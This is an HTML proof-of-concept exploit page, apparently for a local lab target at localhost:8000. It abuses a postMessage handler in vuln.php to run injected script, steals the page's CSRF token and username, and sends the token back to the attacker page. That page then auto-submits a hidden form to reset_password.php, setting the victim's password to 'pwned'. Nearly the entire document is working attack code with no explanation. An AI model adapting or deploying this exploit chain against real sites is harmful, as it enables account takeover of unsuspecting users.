<body>
  <style>
    iframe {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      border: none;
    }
  </style>
  <script>
    // XSS using postMessage handler to leak CSRF token from the same page
    const frame = document.createElement("iframe");
    frame.sandbox = "allow-scripts allow-popups allow-forms allow-modals allow-top-navigation";

    frame.srcdoc = `
  <h1>Click here!</h1>
  <script>
  onclick = () => {
    const w = window.open("http://localhost:8000/vuln.php");
    
    setTimeout(() => {
      w.postMessage(\`
        const form = document.forms[0];
        const csrf = form.csrf.value;
        console.log("Leaked CSRF:", csrf);

        const username = document.body.innerText.match(/Username: ([a-zA-Z0-9 _-]+)/)[1];
        console.log("Leaked username:", username);

        // Leak it back to the attacker to exploit password reset
        opener.top.postMessage(csrf, "*");
        console.log("Resetting password in main window (works if logged <2 minutes ago)...")
      \`, "*");
    }, 2000);
  }
<\/script>
    `;
    document.body.appendChild(frame);

    // Exploit CSRF using leaked token
    onmessage = (e) => {
      const form = document.forms[0];
      form.csrf.value = e.data;
      form.submit();
    };
  </script>
  <form action="http://localhost:8000/reset_password.php" method="post">
    <input type="hidden" name="csrf" value="" />
    <input type="hidden" name="new_password" value="pwned" />
  </form>
</body>
